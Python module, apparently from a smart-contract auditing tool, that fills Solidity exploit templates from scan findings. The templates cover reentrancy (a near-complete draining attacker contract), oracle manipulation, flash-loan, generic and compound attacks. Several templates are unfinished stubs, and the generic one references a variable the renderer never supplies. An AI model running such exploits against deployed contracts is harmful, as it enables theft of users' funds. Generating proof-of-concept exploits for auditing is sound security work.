"""
Proof-of-Concept generation scaffold for discovered vulnerabilities.
"""
from __future__ import annotations

from typing import Dict, List, Optional
from pathlib import Path
import json

from .models import Finding, CorrelatedFinding, ScanContext


class PoCTemplate:
    """Template for generating PoC code."""
    
    def __init__(self, name: str, template: str, description: str):
        self.name = name
        self.template = template
        self.description = description
    
    def render(self, **kwargs) -> str:
        """Render template with provided variables."""
        return self.template.format(**kwargs)


class PoCGenerator:
    """
    Generator for proof-of-concept exploits based on vulnerability findings.
    """
    
    def __init__(self):
        self.templates = self._load_templates()
    
    def generate_poc(
        self, 
        finding: Finding, 
        context: ScanContext,
        output_dir: Optional[Path] = None
    ) -> str:
        """
        Generate proof-of-concept code for a vulnerability finding.
        
        Args:
            finding: The vulnerability finding
            context: Scan context with contract information
            output_dir: Optional directory to write PoC files
            
        Returns:
            Generated PoC code as string
        """
        # Select appropriate template based on vulnerability category
        template = self._select_template(finding)
        
        # Prepare template variables
        variables = self._prepare_template_variables(finding, context)
        
        # Generate PoC code
        poc_code = template.render(**variables)
        
        # Write to file if output directory specified
        if output_dir:
            self._write_poc_file(finding, poc_code, output_dir)
        
        return poc_code
    
    def generate_compound_poc(
        self, 
        corr_finding: CorrelatedFinding, 
        context: ScanContext,
        output_dir: Optional[Path] = None
    ) -> str:
        """
        Generate compound PoC for correlated vulnerabilities.
        """
        # For compound vulnerabilities, create a more sophisticated exploit
        primary = corr_finding.primary_finding
        related = corr_finding.related_findings
        
        # Start with primary vulnerability template
        template = self._select_template(primary)
        variables = self._prepare_template_variables(primary, context)
        
        # Enhance with compound attack logic
        variables["compound_attack"] = self._generate_compound_attack_logic(
            corr_finding, context
        )
        variables["related_exploits"] = self._generate_related_exploits(related, context)
        
        # Use compound template if available
        compound_template = self.templates.get("compound_exploit")
        if compound_template:
            poc_code = compound_template.render(**variables)
        else:
            poc_code = template.render(**variables)
            poc_code += "\n\n" + variables["compound_attack"]
        
        if output_dir:
            filename = f"compound_poc_{primary.detector}_{primary.line}.sol"
            poc_file = output_dir / filename
            poc_file.write_text(poc_code)
        
        return poc_code
    
    def _select_template(self, finding: Finding) -> PoCTemplate:
        """Select appropriate PoC template based on vulnerability type."""
        category = finding.category.lower()
        
        # Map categories to templates
        template_mapping = {
            "reentrancy": "reentrancy_exploit",
            "oracle": "oracle_manipulation",
            "flashloan": "flashloan_exploit",
            "access_control": "privilege_escalation",
            "gas": "gas_exploitation",
            "domain_separator": "domain_separator_exploit",
            "cross_chain": "cross_chain_replay",
        }
        
        template_name = template_mapping.get(category, "generic_exploit")
        return self.templates.get(template_name, self.templates["generic_exploit"])
    
    def _prepare_template_variables(self, finding: Finding, context: ScanContext) -> Dict[str, str]:
        """Prepare variables for template rendering."""
        # Extract contract information
        contract_name = finding.contract_name or "VulnerableContract"
        function_name = finding.function_name or "vulnerableFunction"
        
        # Find contract info if available
        contract_info = None
        if finding.contract_name:
            contract_info = context.get_contract_by_name(finding.contract_name)
        
        return {
            "contract_name": contract_name,
            "function_name": function_name,
            "vulnerable_code": finding.code,
            "vulnerability_title": finding.title,
            "vulnerability_description": finding.description or "No description provided",
            "target_line": str(finding.line),
            "severity": finding.severity.value,
            "attacker_contract": f"{contract_name}Attacker",
            "exploit_function": f"exploit{function_name.title()}",
            "contract_functions": self._extract_function_signatures(contract_info) if contract_info else [],
        }
    
    def _generate_compound_attack_logic(
        self, 
        corr_finding: CorrelatedFinding, 
        context: ScanContext
    ) -> str:
        """Generate logic for compound attack exploitation."""
        findings = corr_finding.all_findings
        attack_steps = []
        
        for i, finding in enumerate(findings):
            step = f"// Step {i+1}: Exploit {finding.title}"
            if finding.category.lower() == "reentrancy":
                attack_steps.append(f"{step}\n    performReentrancyAttack();")
            elif finding.category.lower() == "oracle":
                attack_steps.append(f"{step}\n    manipulateOracle();")
            elif finding.category.lower() == "flashloan":
                attack_steps.append(f"{step}\n    executeFlashLoan();")
            else:
                attack_steps.append(f"{step}\n    exploitVulnerability_{i}();")
        
        return f"""
    function compoundAttack() external {{
        // Compound exploitation strategy
        {chr(10).join(f"        {step}" for step in attack_steps)}
        
        // Cleanup and profit extraction
        extractProfits();
    }}
        """
    
    def _generate_related_exploits(self, related_findings: List[Finding], context: ScanContext) -> str:
        """Generate exploit functions for related vulnerabilities."""
        exploit_functions = []
        
        for i, finding in enumerate(related_findings):
            function_code = f"""
    function exploitVulnerability_{i}() internal {{
        // Exploit: {finding.title}
        // Category: {finding.category}
        // TODO: Implement specific exploit logic
    }}
            """
            exploit_functions.append(function_code)
        
        return "\n".join(exploit_functions)
    
    def _extract_function_signatures(self, contract_info) -> List[str]:
        """Extract function signatures from contract info."""
        if not contract_info or not contract_info.functions:
            return []
        
        signatures = []
        for func in contract_info.functions:
            signatures.append(func.signature)
        
        return signatures
    
    def _write_poc_file(self, finding: Finding, poc_code: str, output_dir: Path):
        """Write PoC code to file."""
        output_dir.mkdir(parents=True, exist_ok=True)
        
        filename = f"poc_{finding.detector}_{finding.line}.sol"
        poc_file = output_dir / filename
        poc_file.write_text(poc_code)
    
    def _load_templates(self) -> Dict[str, PoCTemplate]:
        """Load PoC templates."""
        templates = {}
        
        # Reentrancy exploit template
        templates["reentrancy_exploit"] = PoCTemplate(
            name="reentrancy_exploit",
            description="Reentrancy attack template",
            template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

/**
 * Proof of Concept: {vulnerability_title}
 * Target: {contract_name}.{function_name} (Line {target_line})
 * Severity: {severity}
 */
contract {attacker_contract} {{
    {contract_name} public target;
    uint256 public attackAmount;
    bool public attacking;
    
    constructor(address _target) {{
        target = {contract_name}(_target);
    }}
    
    function {exploit_function}() external payable {{
        require(msg.value > 0, "Need ETH for attack");
        attackAmount = msg.value;
        attacking = true;
        
        // Initial interaction to trigger vulnerability
        target.{function_name}{{value: msg.value}}();
        
        attacking = false;
    }}
    
    // Reentrancy callback
    receive() external payable {{
        if (attacking && address(target).balance >= attackAmount) {{
            target.{function_name}();
        }}
    }}
    
    function withdrawProfits() external {{
        payable(msg.sender).transfer(address(this).balance);
    }}
}}

/**
 * Vulnerability Analysis:
 * {vulnerability_description}
 * 
 * Vulnerable Code:
 * {vulnerable_code}
 */'''
        )
        
        # Oracle manipulation template
        templates["oracle_manipulation"] = PoCTemplate(
            name="oracle_manipulation",
            description="Oracle manipulation attack template",
            template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

/**
 * Proof of Concept: Oracle Manipulation Attack
 * Target: {contract_name}.{function_name} (Line {target_line})
 */
contract {attacker_contract} {{
    {contract_name} public target;
    address public mockOracle;
    
    constructor(address _target) {{
        target = {contract_name}(_target);
        mockOracle = address(this);
    }}
    
    function {exploit_function}() external {{
        // Step 1: Manipulate oracle price
        setMockPrice(1000000 ether); // Artificially high price
        
        // Step 2: Exploit the vulnerable function
        target.{function_name}();
        
        // Step 3: Reset price and extract value
        setMockPrice(1 ether);
        extractValue();
    }}
    
    function setMockPrice(uint256 price) internal {{
        // Mock oracle price manipulation
    }}
    
    function extractValue() internal {{
        // Extract manipulated value
    }}
    
    // Mock oracle interface
    function latestRoundData() external view returns (uint80, int256, uint256, uint256, uint80) {{
        return (0, 1000000 ether, block.timestamp, block.timestamp, 0);
    }}
}}'''
        )
        
        # Flash loan exploit template
        templates["flashloan_exploit"] = PoCTemplate(
            name="flashloan_exploit", 
            description="Flash loan attack template",
            template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

interface IFlashLoanProvider {{
    function flashLoan(uint256 amount, bytes calldata data) external;
}}

/**
 * Proof of Concept: Flash Loan Attack
 * Target: {contract_name}.{function_name} (Line {target_line})
 */
contract {attacker_contract} {{
    {contract_name} public target;
    IFlashLoanProvider public flashLoanProvider;
    
    constructor(address _target, address _flashLoanProvider) {{
        target = {contract_name}(_target);
        flashLoanProvider = IFlashLoanProvider(_flashLoanProvider);
    }}
    
    function {exploit_function}() external {{
        // Request flash loan
        uint256 loanAmount = 1000000 ether;
        flashLoanProvider.flashLoan(loanAmount, abi.encode(msg.sender));
    }}
    
    function executeOperation(uint256 amount, bytes calldata data) external {{
        require(msg.sender == address(flashLoanProvider), "Unauthorized");
        
        // Exploit logic with borrowed funds
        exploitWithBorrowedFunds(amount);
        
        // Repay loan with profit
        repayLoanWithProfit(amount);
    }}
    
    function exploitWithBorrowedFunds(uint256 amount) internal {{
        // Use flash loan to exploit vulnerability
        target.{function_name}();
    }}
    
    function repayLoanWithProfit(uint256 loanAmount) internal {{
        // Calculate profit and repay loan
        uint256 profit = address(this).balance - loanAmount;
        // Transfer loan + fee back to provider
    }}
}}'''
        )
        
        # Generic exploit template
        templates["generic_exploit"] = PoCTemplate(
            name="generic_exploit",
            description="Generic vulnerability exploit template",
            template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

/**
 * Proof of Concept: {vulnerability_title}
 * Target: {contract_name}.{function_name} (Line {target_line})
 * Category: {finding.category}
 * Severity: {severity}
 */
contract {attacker_contract} {{
    {contract_name} public target;
    
    constructor(address _target) {{
        target = {contract_name}(_target);
    }}
    
    function {exploit_function}() external {{
        // Exploit the vulnerability
        target.{function_name}();
        
        // Extract any profits
        extractProfits();
    }}
    
    function extractProfits() internal {{
        // Implementation depends on specific vulnerability
        if (address(this).balance > 0) {{
            payable(msg.sender).transfer(address(this).balance);
        }}
    }}
}}

/**
 * Vulnerability Details:
 * {vulnerability_description}
 * 
 * Vulnerable Code:
 * {vulnerable_code}
 */'''
        )
        
        # Compound exploit template
        templates["compound_exploit"] = PoCTemplate(
            name="compound_exploit",
            description="Compound vulnerability exploit template",
            template='''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./{contract_name}.sol";

/**
 * Proof of Concept: Compound Vulnerability Exploit
 * Primary Target: {contract_name}.{function_name} (Line {target_line})
 * Severity: {severity}
 */
contract {attacker_contract} {{
    {contract_name} public target;
    
    constructor(address _target) {{
        target = {contract_name}(_target);
    }}
    
    function executeCompoundAttack() external {{
        // Multi-stage compound exploit
        {compound_attack}
    }}
    
    {related_exploits}
    
    function extractProfits() internal {{
        // Extract all accumulated profits
        if (address(this).balance > 0) {{
            payable(msg.sender).transfer(address(this).balance);
        }}
    }}
}}'''
        )
        
        return templates